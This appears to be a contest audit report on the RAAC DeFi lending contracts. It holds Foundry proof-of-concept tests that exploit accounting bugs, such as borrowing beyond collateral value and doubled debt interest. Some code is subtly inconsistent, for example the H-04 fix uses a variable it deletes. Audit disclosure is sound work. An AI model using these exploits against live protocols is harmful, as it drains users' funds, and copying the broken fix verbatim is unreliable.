# Core Contracts - Findings Report

# Table of contents
- ## High Risk Findings
    - ### [H-01. Missing Override for Approve and Permit in RToken](#H-01)
    - ### [H-02. Decimal Mismatch in ZENO and Auction Contracts](#H-02)
    - ### [H-03. Lack of Token Withdrawal Mechanism in RAACNFT Contract](#H-03)
    - ### [H-04. Double-Scaled Transfer Issue in RToken](#H-04)
    - ### [H-05. When minting a token in the DebtToken::mint function, an additional balanceIncrease is added to the debt, doubling the interest on the debt.](#H-05)
    - ### [H-06. Users can borrow more assets than they have deposited as collateral](#H-06)
- ## Medium Risk Findings
    - ### [M-01. Inaccurate calculateDustAmount Implementation in RToken Contract](#M-01)
    - ### [M-02. Incorrect Return Value in ReserveLibrary::getNormalizedDebt Function](#M-02)
    - ### [M-03. Race Condition in House Price Updates](#M-03)
    - ### [M-04. Outdated NormalizedIncome in RToken Transfer Functions](#M-04)
    - ### [M-05. Market Pause Prevents Debt Repayment and Collateral Addition](#M-05)
    - ### [M-06. In RToken Contract, the mint and burn functions return incorrect values.](#M-06)
    - ### [M-07. Incorrect Dust Calculation in RToken](#M-07)
    - ### [M-08. Incorrect Liquidation Closure and Finalization Logic](#M-08)
    - ### [M-09. Incorrect DebtToken::totalSupply Calculation](#M-09)
- ## Low Risk Findings
    - ### [L-01. Missing Burn Functionality in RAACNFT](#L-01)
    - ### [L-02. Missing Index Updates in RToken and DebtToken Contracts](#L-02)
    - ### [L-03. Incorrect Comparison Between Scaled and Unscaled Amounts in _repay](#L-03)
    - ### [L-04. If the Rtoken Contract is minted with 0 amount, an invalid value is returned.](#L-04)
    - ### [L-05. Unreachable rescueToken Function in RToken Contract](#L-05)
    - ### [L-06. Inaccurate Update Timestamp for Token Prices](#L-06)

<br>


# High Risk Findings

### <a id='H-01'></a>H-01. Missing Override for Approve and Permit in RToken            



### 01. Relevant GitHub Links

&#x20;

* [RToken.sol#L22](https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/tokens/RToken.sol#L22)

#### 02. Summary

In this RToken implementation, the standard `approve` and `permit` functions are not overridden. Since RToken balances do not carry the same value as the underlying asset balance (they must be scaled by `rayMul(NormalizedIncome)`), a user could unintentionally allow more tokens than they initially expect.

### 03. Vulnerability Details

* Behavior: The approve and permit functions in RToken behave the same as in a typical ERC20 token, but the actual token value is scaled by `rayMul(NormalizedIncome)`.
* Consequence: Because of this scaling, the allowance set through approve or permit might not accurately reflect the real value of the tokens. Users relying on these functions could end up granting a higher allowance than intended.

### 04. Impact

If users or other contracts rely on the standard ERC20 allowance mechanism, they might unknowingly approve or permit a larger amount of tokens. This discrepancy may lead to unintended token transfers or a loss of precise control over token spending.

### 05. Tools Used

Manual Code Review and Foundry

### 06. Recommended Mitigation

Override the `approve` and `permit` functions to account for the scaling logic. Ensure that any allowances correctly consider the NormalizedIncome so that the approved amounts match users’ expectations.

## <a id='H-02'></a>H-02. Decimal Mismatch in ZENO and Auction Contracts            



### 01. Relevant GitHub Link

&#x20;

* [Auction.sol#L8](https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/zeno/Auction.sol#L84)
* [ZENO.sol#L62](https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/zeno/ZENO.sol#L62)

### 02. Summary

In the current implementation, users who purchase ZENO tokens will incur a loss when redeeming them later.

The ZENO token can be purchased with USDC and redeemed after maturity. However, both the Auction contract and the ZENO contract suffer from decimal mismatches and design flaws, which lead to inaccurate pricing and potential redemption issues.

### 03. Vulnerability Details

* Decimal Mismatch in `Auction::buy`:

The function calculates cost by simply multiplying price (1e6) by amount (1e18), resulting in a significant overcharge for buyers because it applies the price to each 1 wei of ZENO rather than scaling properly.

```Solidity
/**
    Bid on the ZENO auction
    User will able to buy ZENO tokens in exchange for USDC
 */
function buy(uint256 amount) external whenActive {
    require(amount <= state.totalRemaining, "Not enough ZENO remaining");
    uint256 price = getPrice();
    uint256 cost = price * amount;

    require(
        usdc.transferFrom(msg.sender, businessAddress, cost),
        "Transfer failed"
    );
    ...
```

* Incorrect Redemption Logic in `ZENO::redeem`:

When redeeming, the contract transfers USDC in a 1:1 ratio to the ZENO amount. If ZENO was bought at a high price due to the decimal mismatch, users will not receive the equivalent value in USDC upon redemption.

```Solidity

function redeem(uint amount) external nonReentrant {
    if (!isRedeemable()) {
        revert BondNotRedeemable();
    }

    if (amount == 0) {
        revert ZeroAmount();
    }

    uint256 totalAmount = balanceOf(msg.sender);
    if (amount > totalAmount) {
        revert InsufficientBalance();
    }

    totalZENORedeemed += amount;
    _burn(msg.sender, amount);
    USDC.safeTransfer(msg.sender, amount); 
}
```

* Incorrect Redemption Logic in ZENO::redeem:

Also, `ZENO::redeem` is transferring USDC for the value of the token being redeemed, i.e. if you buy an amount of ZENO tokens at price, you will only receive USDC for amount when you redeem them later, not amount\*price. Also, the capitalization of ZENO tokens and decimal is different, which can be confusing.

Also, since different users purchased ZENO Tokens at different prices, everyone should not transfer USDC just for the value of the ZENO Tokens they are burning.

* Immediate Redemption Uncertainty:

The documentation implies USDC can be redeemed immediately after maturity, but the ZENO contract itself holds no USDC if the business address retains the tokens. This design can make instant redemption impossible if USDC is not available in the ZENO contract.

Also, the decimal of ZENO Token and USDC Token are different, which can cause problems.

### 04. Impact

Because of the incorrect price calculation and 1:1 redemption mechanism, buyers may overpay during purchase and under-redeem at maturity, causing direct financial losses for users.

### 05. Tools Used

Manual Code Review and Foundry

## <a id='H-03'></a>H-03. Lack of Token Withdrawal Mechanism in RAACNFT Contract            



### 01. Relevant GitHub Links

* [RAACNFT.sol#L32](https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/tokens/RAACNFT.sol#L32)

### 02. Summary

When users mint an NFT by paying an appropriate token amount, the RAACNFT contract receives and holds these tokens. However, there is no mechanism to withdraw these tokens from the contract.

### 03. Vulnerability Details

The mint function transfers ERC20 tokens from the user to the RAACNFT contract.

```solidity
function mint(uint256 _tokenId, uint256 _amount) public override {
    uint256 price = raac_hp.tokenToHousePrice(_tokenId);
    if(price == 0) { revert RAACNFT__HousePrice(); }
    if(price > _amount) { revert RAACNFT__InsufficientFundsMint(); }

    // transfer erc20 from user to contract - requires pre-approval from user
@>  token.safeTransferFrom(msg.sender, address(this), _amount);

    // mint tokenId to user
    _safeMint(msg.sender, _tokenId);

     // If user approved more than necessary, refund the difference
    if (_amount > price) {
        uint256 refundAmount = _amount - price;
        token.safeTransfer(msg.sender, refundAmount);
    }

    emit NFTMinted(msg.sender, _tokenId, price);
}
```

Since the contract lacks a function to withdraw or transfer these funds out, the assets remain locked within the contract indefinitely.

### 04. Impact

Tokens paid for NFT purchases are permanently inaccessible once transferred to the contract, resulting in locked liquidity and potential financial loss.

### 05. Tools Used

Manual Code Review and Foundry

### 06. Recommended Mitigation

Implement a withdrawal function or mechanism allowing the contract owner (or other authorized entity) to transfer out any ERC20 tokens held by the contract.

## <a id='H-04'></a>H-04. Double-Scaled Transfer Issue in RToken            



### 01. Relevant GitHub Links

&#x20;

* [RToken.sol#L212](https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/tokens/RToken.sol#L212)
* [RToken.sol#L223](https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/tokens/RToken.sol#L223)

### 02. Summary

The RToken contract applies scaling twice when a user calls `transfer` or `transferFrom`. Since the `_update` function already handles scaling, the additional scaling in `transfer` and `transferFrom` causes the actual transferred amount to be lower than expected. As time passes and `getNormalizedIncome` grows, the gap becomes larger.

### 03. Vulnerability Details

`RToken::transfer` calculates scaledAmount by dividing the user’s desired transfer amount by `getNormalizedIncome`.

```Solidity
/**
 * @dev Overrides the ERC20 transfer function to use scaled amounts
 * @param recipient The recipient address
 * @param amount The amount to transfer (in underlying asset units)
 */
function transfer(address recipient, uint256 amount) public override(ERC20, IERC20) returns (bool) {
    uint256 scaledAmount = amount.rayDiv(ILendingPool(_reservePool).getNormalizedIncome());
    return super.transfer(recipient, scaledAmount);
}
```

However, `_update` also scales amount internally, causing a double scaling effect. The same bug occurs in transferFrom, leading to a significant under-transfer of tokens over time.

```Solidity
function _update(address from, address to, uint256 amount) internal override {
    // Scale amount by normalized income for all operations (mint, burn, transfer)
    uint256 scaledAmount = amount.rayDiv(ILendingPool(_reservePool).getNormalizedIncome());
    super._update(from, to, scaledAmount);
}
```

### 04. Impact

When users `transfer` or `transferFrom` their RToken balances, they lose a portion of the intended `transfer` amount. As time goes on and `getNormalizedIncome` increases, the discrepancy in the transferred amount also grows, potentially leading to a significant loss.

### 05. Proof of Concept

Running `forge test –mt test_poc_transfer -vv` shows that Alice tries to transfer 50e18 to Bob, but only `100352011494252873563` is actually sent. The logs confirm that Alice’s balance remains higher than expected, while Bob’s balance is lower than intended.

```Solidity
[PASS] test_transfer() (gas: 659079)
Logs:
  rTokenInstance.balanceOf(alice):  4022988505747126437
  rTokenInstance.balanceOf(bob):  100352011494252873563
```

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test, console} from "forge-std/Test.sol";

import {crvUSDToken} from "src/mocks/core/tokens/crvUSDToken.sol";
import {RAACHousePrices} from "src/core/primitives/RAACHousePrices.sol";
import {RAACNFT} from "src/core/tokens/RAACNFT.sol";

import {IRToken, RToken} from "src/core/tokens/RToken.sol";
import {DebtToken} from "src/core/tokens/DebtToken.sol";
import {LendingPool} from "src/core/pools/LendingPool/LendingPool.sol";

import {ReserveLibrary} from "src/libraries/pools/ReserveLibrary.sol";

contract BaseTest is Test {
    crvUSDToken public crvUSDTokenInstance;
    RAACHousePrices public raacHousePricesInstance;
    RAACNFT public raacNFTInstance;
    RToken public rTokenInstance;
    DebtToken public debtTokenInstance;
    LendingPool public lendingPoolInstance;

    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address hyuunn = makeAddr("hyuunn");

    function setUp() public {
        // crvUSDToken deploy
        crvUSDTokenInstance = new crvUSDToken(address(this));

        // raacHousePrices deploy
        raacHousePricesInstance = new RAACHousePrices(address(this));
        raacHousePricesInstance.setOracle(address(this));

        // raacNFT deploy
        raacNFTInstance = new RAACNFT(
            address(crvUSDTokenInstance),
            address(raacHousePricesInstance),
            address(this)
        );

        _mintRaacNFT();

        rTokenInstance = new RToken(
            "RToken",
            "RTK",
            address(this),
            address(crvUSDTokenInstance)
        );
        debtTokenInstance = new DebtToken("DebtToken", "DEBT", address(this));

        lendingPoolInstance = new LendingPool(
            address(crvUSDTokenInstance),
            address(rTokenInstance),
            address(debtTokenInstance),
            address(raacNFTInstance),
            address(raacHousePricesInstance),
            0.1e27
        );

        rTokenInstance.setReservePool(address(lendingPoolInstance));
        debtTokenInstance.setReservePool(address(lendingPoolInstance));
    }

    function _mintRaacNFT() internal {
        // housePrices setting
        raacHousePricesInstance.setHousePrice(0, 100e18);
        raacHousePricesInstance.setHousePrice(1, 50e18);
        raacHousePricesInstance.setHousePrice(2, 150e18);

        // crvUSDToken mint
        deal(address(crvUSDTokenInstance), alice, 1000e18);
        deal(address(crvUSDTokenInstance), bob, 1000e18);
        deal(address(crvUSDTokenInstance), hyuunn, 1000e18);

        // raacNFT mint
        vm.startPrank(alice);
        crvUSDTokenInstance.approve(address(raacNFTInstance), 100e18 + 1);
        raacNFTInstance.mint(0, 100e18 + 1);
        vm.stopPrank();

        vm.startPrank(bob);
        crvUSDTokenInstance.approve(address(raacNFTInstance), 50e18 + 1);
        raacNFTInstance.mint(1, 50e18 + 1);
        vm.stopPrank();
    }

    function test_poc_transfer() public {
        // 1. bob deposit, depositNFT, borrow, repay
        // (Many people have interacted with lendingPool)
        vm.startPrank(bob);
        crvUSDTokenInstance.approve(address(lendingPoolInstance), 500e18);
        lendingPoolInstance.deposit(50e18);

        raacNFTInstance.approve(address(lendingPoolInstance), 1);
        lendingPoolInstance.depositNFT(1);

        lendingPoolInstance.borrow(10e18);

        vm.warp(block.timestamp + 365 days * 10);

        crvUSDTokenInstance.approve(address(lendingPoolInstance), type(uint256).max);
        lendingPoolInstance.repay(type(uint256).max);

        vm.stopPrank();

        // 1. alice deposit 50e18
        // However, fewer assets are sent than expected.
        // This gap widens as more time passes.
        vm.startPrank(alice);
        crvUSDTokenInstance.approve(address(lendingPoolInstance), 50e18);
        lendingPoolInstance.deposit(50e18);

        assertEq(rTokenInstance.balanceOf(alice), 50e18);

        rTokenInstance.transfer(bob, 50e18);

        console.log("rTokenInstance.balanceOf(alice): ", rTokenInstance.balanceOf(alice));
        console.log("rTokenInstance.balanceOf(bob): ", rTokenInstance.balanceOf(bob));
    }
}
```

### 06. Tools Used

Manual Code Review and Foundry

### 07. Recommended Mitigation

```Solidity
/**
 * @dev Overrides the ERC20 transfer function to use scaled amounts
 * @param recipient The recipient address
 * @param amount The amount to transfer (in underlying asset units)
 */
function transfer(address recipient, uint256 amount) public override(ERC20, IERC20) returns (bool) {
-   uint256 scaledAmount = amount.rayDiv(ILendingPool(_reservePool).getNormalizedIncome());
    return super.transfer(recipient, scaledAmount);
}
```

## <a id='H-05'></a>H-05. When minting a token in the DebtToken::mint function, an additional balanceIncrease is added to the debt, doubling the interest on the debt.            



### 01. Relevant GitHub Links

&#x20;

* [DebtToken.sol#L136](https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/tokens/DebtToken.sol#L136)

### 02. Summary

When the token is minted in the `DebtToken::mint` function, the balanceIncrease is added to the debt to increase the debt.

### 03. Vulnerability Details

The `DebtToken::mint` function is used to mint a DebtToken to the user when the user borrows.

```Solidity
function mint(
    address user,
    address onBehalfOf,
    uint256 amount,
    uint256 index
)  external override onlyReservePool returns (bool, uint256, uint256) {
    if (user == address(0) || onBehalfOf == address(0)) revert InvalidAddress();
    if (amount == 0) {
        return (false, 0, totalSupply());
    }

    uint256 amountScaled = amount.rayDiv(index);
    if (amountScaled == 0) revert InvalidAmount();

    uint256 scaledBalance = balanceOf(onBehalfOf);
    bool isFirstMint = scaledBalance == 0;

    uint256 balanceIncrease = 0;
    if (_userState[onBehalfOf].index != 0 && _userState[onBehalfOf].index < index) {
@>      balanceIncrease = scaledBalance.rayMul(index) - scaledBalance.rayMul(_userState[onBehalfOf].index);
    }

    _userState[onBehalfOf].index = index.toUint128();

@>  uint256 amountToMint = amount + balanceIncrease;

    _mint(onBehalfOf, amountToMint.toUint128());

    emit Transfer(address(0), onBehalfOf, amountToMint);
    emit Mint(user, onBehalfOf, amountToMint, balanceIncrease, index);

    return (scaledBalance == 0, amountToMint, totalSupply());
}

```

balanceIncrease is calculated and added to amountToMint. However, balanceIncrease is a value that will increase as the index increases, so it doesn't need to be added. However, since it’s adding it once more, the interest is doubled.

### 04. Impact

* The user has to pay more interest on the loan than expected.
* This causes the user to lose assets.

### 05. Proof of Concept

You can test the following PoC with the `forge test --mt test_poc_user_debt -vv` command. Initially borrow `50e18` and then borrow `50e18` after some time. If you look at the log, the interest charged after the time is `9935741025606941332`, but when you borrow again, more interest is added.

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test, console} from "forge-std/Test.sol";

import {crvUSDToken} from "src/mocks/core/tokens/crvUSDToken.sol";
import {RAACHousePrices} from "src/core/primitives/RAACHousePrices.sol";
import {RAACNFT} from "src/core/tokens/RAACNFT.sol";

import {RToken} from "src/core/tokens/RToken.sol";
import {DebtToken} from "src/core/tokens/DebtToken.sol";
import {LendingPool} from "src/core/pools/LendingPool/LendingPool.sol";

import {ReserveLibrary} from "src/libraries/pools/ReserveLibrary.sol";

contract BaseTest is Test {
    crvUSDToken public crvUSDTokenInstance;
    RAACHousePrices public raacHousePricesInstance;
    RAACNFT public raacNFTInstance;
    RToken public rTokenInstance;
    DebtToken public debtTokenInstance;
    LendingPool public lendingPoolInstance;

    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address hyuunn = makeAddr("hyuunn");

    function setUp() public {
        // crvUSDToken deploy
        crvUSDTokenInstance = new crvUSDToken(address(this));

        // raacHousePrices deploy
        raacHousePricesInstance = new RAACHousePrices(address(this));
        raacHousePricesInstance.setOracle(address(this));

        // raacNFT deploy
        raacNFTInstance = new RAACNFT(
            address(crvUSDTokenInstance),
            address(raacHousePricesInstance),
            address(this)
        );

        _mintRaacNFT();

        rTokenInstance = new RToken(
            "RToken",
            "RTK",
            address(this),
            address(crvUSDTokenInstance)
        );
        debtTokenInstance = new DebtToken("DebtToken", "DEBT", address(this));

        lendingPoolInstance = new LendingPool(
            address(crvUSDTokenInstance),
            address(rTokenInstance),
            address(debtTokenInstance),
            address(raacNFTInstance),
            address(raacHousePricesInstance),
            0.1e27
        );

        rTokenInstance.setReservePool(address(lendingPoolInstance));
        debtTokenInstance.setReservePool(address(lendingPoolInstance));
    }

    function _mintRaacNFT() internal {
        // housePrices setting
        raacHousePricesInstance.setHousePrice(0, 100e18);
        raacHousePricesInstance.setHousePrice(1, 50e18);
        raacHousePricesInstance.setHousePrice(2, 150e18);

        // crvUSDToken mint
        deal(address(crvUSDTokenInstance), alice, 1000e18);
        deal(address(crvUSDTokenInstance), bob, 1000e18);
        deal(address(crvUSDTokenInstance), hyuunn, 1000e18);

        // raacNFT mint
        vm.startPrank(alice);
        crvUSDTokenInstance.approve(address(raacNFTInstance), 100e18 + 1);
        raacNFTInstance.mint(0, 100e18 + 1);
        vm.stopPrank();

        vm.startPrank(bob);
        crvUSDTokenInstance.approve(address(raacNFTInstance), 50e18 + 1);
        raacNFTInstance.mint(1, 50e18 + 1);
        vm.stopPrank();
    }

    function test_poc_user_debt() public {
        // 1. bob deposit, depositNFT, borrow
        vm.startPrank(bob);
        crvUSDTokenInstance.approve(address(lendingPoolInstance), 500e18);
        lendingPoolInstance.deposit(500e18);

        raacNFTInstance.approve(address(lendingPoolInstance), 1);
        lendingPoolInstance.depositNFT(1);

        lendingPoolInstance.borrow(10e18);
        vm.stopPrank();
        
        // 2. alice depositNFT 0 and borrow
        vm.startPrank(alice);
        raacNFTInstance.approve(address(lendingPoolInstance), 0);
        lendingPoolInstance.depositNFT(0);

        assertEq(lendingPoolInstance.getUserCollateralValue(alice), 100e18);

        lendingPoolInstance.borrow(50e18);
        assertEq(debtTokenInstance.balanceOf(alice), 50e18);

        console.log("Alice debt: ", debtTokenInstance.balanceOf(alice));
        vm.stopPrank();

        // time warp
        vm.warp(block.timestamp + 365 days * 5);
        
        lendingPoolInstance.updateState();
        console.log("Alice debt over time: ", debtTokenInstance.balanceOf(alice));
        uint256 before = debtTokenInstance.balanceOf(alice);

        // 3. alice borrow more
        // alice's debt increases.
        vm.startPrank(alice);
        lendingPoolInstance.borrow(50e18);

        console.log("Alice's debt for borrowing an additional 50e18: ", debtTokenInstance.balanceOf(alice));
        console.log("Alice's Increased debt: ", debtTokenInstance.balanceOf(alice) - before - 50e18);
        
        vm.stopPrank();
        
    }
}

```

```Solidity
Ran 1 test for test/BaseSetup.s.sol:BaseTest
[PASS] test_poc_user_debt() (gas: 882007)
Logs:
  Alice debt:  50000000000000000000
  Alice debt over time:  59935741025606941332
  Alice's debt for borrowing an additional 50e18:  121845861045772460152
  Alice's Increased debt:  11910120020165518820

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 13.13ms (2.58ms CPU time)

```

### 06. Tools Used

Manual Code Review and Foundry

### 07. Recommended Mitigation

```diff
function mint(
    address user,
    address onBehalfOf,
    uint256 amount,
    uint256 index
)  external override onlyReservePool returns (bool, uint256, uint256) {
    if (user == address(0) || onBehalfOf == address(0)) revert InvalidAddress();
    if (amount == 0) {
        return (false, 0, totalSupply());
    }

    uint256 amountScaled = amount.rayDiv(index);
    if (amountScaled == 0) revert InvalidAmount();

    uint256 scaledBalance = balanceOf(onBehalfOf);
    bool isFirstMint = scaledBalance == 0;

    uint256 balanceIncrease = 0;
    if (_userState[onBehalfOf].index != 0 && _userState[onBehalfOf].index < index) {
        balanceIncrease = scaledBalance.rayMul(index) - scaledBalance.rayMul(_userState[onBehalfOf].index);
    }

    _userState[onBehalfOf].index = index.toUint128();

-   uint256 amountToMint = amount + balanceIncrease;
+   uint256 amountToMint = amount;

    _mint(onBehalfOf, amountToMint.toUint128());

    emit Transfer(address(0), onBehalfOf, amountToMint);
    emit Mint(user, onBehalfOf, amountToMint, balanceIncrease, index);

    return (scaledBalance == 0, amountToMint, totalSupply());
}

```

## <a id='H-06'></a>H-06. Users can borrow more assets than they have deposited as collateral            



### 01. Relevant GitHub Links

&#x20;

* [LendingPool.sol#L344](https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/pools/LendingPool/LendingPool.sol#L344)

### 02. Summary

The `DebtToken::borrow` function incorrectly verifies whether the user has sufficient collateral, allowing them to borrow more than expected.

### 03. Vulnerability Details

There is an issue in the `DebtToken::borrow` function where it checks if the user has enough collateral.

```
function borrow(uint256 amount) external nonReentrant whenNotPaused onlyValidAmount(amount) {
    if (isUnderLiquidation[msg.sender]) revert CannotBorrowUnderLiquidation();

    UserData storage user = userData[msg.sender];

    uint256 collateralValue = getUserCollateralValue(msg.sender);

    if (collateralValue == 0) revert NoCollateral();

    // Update reserve state before borrowing
    ReserveLibrary.updateReserveState(reserve, rateData);

    // Ensure sufficient liquidity is available
    _ensureLiquidity(amount);

    // Fetch user's total debt after borrowing
    uint256 userTotalDebt = user.scaledDebtBalance.rayMul(reserve.usageIndex) + amount;

    // Ensure the user has enough collateral to cover the new debt
@>  if (collateralValue < userTotalDebt.percentMul(liquidationThreshold)) {
        revert NotEnoughCollateralToBorrow();
    }

    // Update user's scaled debt balance
    uint256 scaledAmount = amount.rayDiv(reserve.usageIndex);
    
    ...
```

Because `percentMul(liquidationThreshold)` is calculated on userTotalDebt, the amount of collateral required for the user to borrow is smaller.

이 문제는 withdrawNFT 함수에서도 나타난다. userDebt을 percentMul(liquidationThreshold)로 계산하기 때문에 사용자가 필요한 담보가 더 적게 계산된다.

```
/**
 * @notice Allows a user to withdraw an NFT
 * @param tokenId The token ID of the NFT to withdraw
 */
function withdrawNFT(uint256 tokenId) external nonReentrant whenNotPaused {
    if (isUnderLiquidation[msg.sender])
        revert CannotWithdrawUnderLiquidation();

    UserData storage user = userData[msg.sender];
    if (!user.depositedNFTs[tokenId]) revert NFTNotDeposited();

    // update state
    ReserveLibrary.updateReserveState(reserve, rateData);

    // Check if withdrawal would leave user undercollateralized
    uint256 userDebt = user.scaledDebtBalance.rayMul(reserve.usageIndex);
    uint256 collateralValue = getUserCollateralValue(msg.sender);
    uint256 nftValue = getNFTPrice(tokenId);

    if (
        collateralValue - nftValue <
@>      userDebt.percentMul(liquidationThreshold)
    ) {
        revert WithdrawalWouldLeaveUserUnderCollateralized();
    }
```

### 04. Impact

* Since users can borrow more value than their collateral, they can repeat the process of buying NFTs and lending externally to take away protocol assets.

### 05. Proof of Concept

If you run the PoC with the command `forge test --mt test_poc_user_can_borrow_more_than_collateralValue`, you can see that you have deposited 100e18 nft but can borrow 120e18.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test, console} from "forge-std/Test.sol";

import {crvUSDToken} from "src/mocks/core/tokens/crvUSDToken.sol";
import {RAACHousePrices} from "src/core/primitives/RAACHousePrices.sol";
import {RAACNFT} from "src/core/tokens/RAACNFT.sol";

import {RToken} from "src/core/tokens/RToken.sol";
import {DebtToken} from "src/core/tokens/DebtToken.sol";
import {LendingPool} from "src/core/pools/LendingPool/LendingPool.sol";

import {ReserveLibrary} from "src/libraries/pools/ReserveLibrary.sol";

contract BaseTest is Test {
    crvUSDToken public crvUSDTokenInstance;
    RAACHousePrices public raacHousePricesInstance;
    RAACNFT public raacNFTInstance;
    RToken public rTokenInstance;
    DebtToken public debtTokenInstance;
    LendingPool public lendingPoolInstance;

    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address hyuunn = makeAddr("hyuunn");

    function setUp() public {
        // crvUSDToken deploy
        crvUSDTokenInstance = new crvUSDToken(address(this));

        // raacHousePrices deploy
        raacHousePricesInstance = new RAACHousePrices(address(this));
        raacHousePricesInstance.setOracle(address(this));

        // raacNFT deploy
        raacNFTInstance = new RAACNFT(
            address(crvUSDTokenInstance),
            address(raacHousePricesInstance),
            address(this)
        );

        _mintRaacNFT();

        rTokenInstance = new RToken(
            "RToken",
            "RTK",
            address(this),
            address(crvUSDTokenInstance)
        );
        debtTokenInstance = new DebtToken("DebtToken", "DEBT", address(this));

        lendingPoolInstance = new LendingPool(
            address(crvUSDTokenInstance),
            address(rTokenInstance),
            address(debtTokenInstance),
            address(raacNFTInstance),
            address(raacHousePricesInstance),
            0.1e27
        );

        rTokenInstance.setReservePool(address(lendingPoolInstance));
        debtTokenInstance.setReservePool(address(lendingPoolInstance));
    }

    function _mintRaacNFT() internal {
        // housePrices setting
        raacHousePricesInstance.setHousePrice(0, 100e18);
        raacHousePricesInstance.setHousePrice(1, 50e18);
        raacHousePricesInstance.setHousePrice(2, 150e18);

        // crvUSDToken mint
        deal(address(crvUSDTokenInstance), alice, 1000e18);
        deal(address(crvUSDTokenInstance), bob, 1000e18);
        deal(address(crvUSDTokenInstance), hyuunn, 1000e18);

        // raacNFT mint
        vm.startPrank(alice);
        crvUSDTokenInstance.approve(address(raacNFTInstance), 100e18 + 1);
        raacNFTInstance.mint(0, 100e18 + 1);
        vm.stopPrank();

        vm.startPrank(bob);
        crvUSDTokenInstance.approve(address(raacNFTInstance), 50e18 + 1);
        raacNFTInstance.mint(1, 50e18 + 1);
        vm.stopPrank();
    }

    function test_poc_user_can_borrow_more_than_collateralValue() public {
        // 1. bob deposit
        vm.startPrank(bob);
        crvUSDTokenInstance.approve(address(lendingPoolInstance), 500e18);
        lendingPoolInstance.deposit(500e18);
        vm.stopPrank();
        
        // 2. alice depositNFT 0
        // 2. 0 NFTs are worth 100E18
        vm.startPrank(alice);
        raacNFTInstance.approve(address(lendingPoolInstance), 0);
        lendingPoolInstance.depositNFT(0);

        assertEq(lendingPoolInstance.getUserCollateralValue(alice), 100e18);

        // 3. alice can borrow more than 100e18
        lendingPoolInstance.borrow(120e18);
    }

}
```

### 06. Tools Used

Manual Code Review and Foundry

### 07. Recommended Mitigation

```
function borrow(uint256 amount) external nonReentrant whenNotPaused onlyValidAmount(amount) {
    if (isUnderLiquidation[msg.sender]) revert CannotBorrowUnderLiquidation();

    UserData storage user = userData[msg.sender];

    uint256 collateralValue = getUserCollateralValue(msg.sender);

    if (collateralValue == 0) revert NoCollateral();

    // Update reserve state before borrowing
    ReserveLibrary.updateReserveState(reserve, rateData);

    // Ensure sufficient liquidity is available
    _ensureLiquidity(amount);

    // Fetch user's total debt after borrowing
    uint256 userTotalDebt = user.scaledDebtBalance.rayMul(reserve.usageIndex) + amount;

    // Ensure the user has enough collateral to cover the new debt
-   if (collateralValue < userTotalDebt.percentMul(liquidationThreshold)) {    
+   if (collateralValue.percentMul(liquidationThreshold) < userTotalDebt) {
        revert NotEnoughCollateralToBorrow();
    }

    // Update user's scaled debt balance
    uint256 scaledAmount = amount.rayDiv(reserve.usageIndex);
    
    ...

```

```diff
/**
 * @notice Allows a user to withdraw an NFT
 * @param tokenId The token ID of the NFT to withdraw
 */
function withdrawNFT(uint256 tokenId) external nonReentrant whenNotPaused {
    if (isUnderLiquidation[msg.sender])
        revert CannotWithdrawUnderLiquidation();

    UserData storage user = userData[msg.sender];
    if (!user.depositedNFTs[tokenId]) revert NFTNotDeposited();

    // update state
    ReserveLibrary.updateReserveState(reserve, rateData);

    // Check if withdrawal would leave user undercollateralized
    uint256 userDebt = user.scaledDebtBalance.rayMul(reserve.usageIndex);
    uint256 collateralValue = getUserCollateralValue(msg.sender);
    uint256 nftValue = getNFTPrice(tokenId);

    if (
-       collateralValue - nftValue <
+       (collateralValue - nftValue).percentMul(liquidationThreshold) <
-       userDebt.percentMul(liquidationThreshold)
+       userDebt
    ) {
        revert WithdrawalWouldLeaveUserUnderCollateralized();
    }

```

<br>
    
# Medium Risk Findings

## <a id='M-01'></a>M-01. Inaccurate calculateDustAmount Implementation in RToken Contract            



### 01. Relevant GitHub Links

&#x20;

* [RToken.sol#L317](https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/tokens/RToken.sol#L317)

### 02. Summary

The `calculateDustAmount` function in the `RToken` contract is supposed to identify extra tokens (dust) in the contract that are not accounted for by the `total RToken supply`. This dust calculation is used by the protocol owner to withdraw fees. However, the function incorrectly depends on the contract’s own ERC20 balance, ignoring assets that could be held in a Curve vault or removed due to borrow actions. As a result, the calculated dust amount may stay at zero, preventing the owner from withdrawing fees.

### 03. Vulnerability Details

```Solidity
/**
 * @notice Calculate the dust amount in the contract
 * @return The amount of dust in the contract
 */
function calculateDustAmount() public view returns (uint256) {
    // Calculate the actual balance of the underlying asset held by this contract
    uint256 contractBalance = IERC20(_assetAddress).balanceOf(address(this)).rayDiv(ILendingPool(_reservePool).getNormalizedIncome());

    // Calculate the total real obligations to the token holders
    uint256 currentTotalSupply = totalSupply();

    // Calculate the total real balance equivalent to the total supply
    uint256 totalRealBalance = currentTotalSupply.rayMul(ILendingPool(_reservePool).getNormalizedIncome());

    // All balance, that is not tied to rToken are dust (can be donated or is the rest of exponential vs linear)
    return contractBalance <= totalRealBalance ? 0 : contractBalance - totalRealBalance;
}
```

* Vault Deposits Ignored: If some assets are deposited in a Curve vault, the RToken contract no longer holds them directly. Thus, using `IERC20(_assetAddress).balanceOf(address(this))` underestimates the protocol’s total assets.

```Solidity
